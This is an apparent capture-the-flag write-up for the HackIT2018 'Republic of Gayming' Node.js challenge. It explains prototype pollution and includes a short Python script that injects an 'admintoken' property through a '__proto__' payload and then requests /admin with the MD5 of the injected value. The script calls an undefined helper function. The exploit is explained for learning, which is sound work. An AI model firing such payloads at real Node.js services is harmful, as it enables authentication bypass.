This challenge was provided with source code access, written in nodejs.
The bug is related to prototype pollution in the [line](https://github.com/DefConUA/HackIT2018/blob/master/web/Republic_of_Gayming/app.js#L64)
The general idea behind prototype pollution is when you an expression like : 
obj[a][b] = value

And user can control a,b and value
if the users sets "a" to "\__proto__" and "b" to any property , he can injects attributes in all existing objects with the value "value"
for more details check [this](https://github.com/HoLyVieR/prototype-pollution-nsec18)

the script I used is pretty simple, pollute array proto with attribute admintoken and an arbitrary value, then query /admin with the md5 of that value,
Note: At some points lot of teams were changing the __proto__ at the same time so it became like a trivial race condition, but it can be won easy 
```python
import requests


r = requests.post('http://185.168.131.1:3000/api',json={'row':'__proto__','col':'admintoken','data':'qqq'})
r = requests.get('http://185.168.131.1:3000/admin?querytoken=' + md5sumhex('qqq'))
print r.text

```
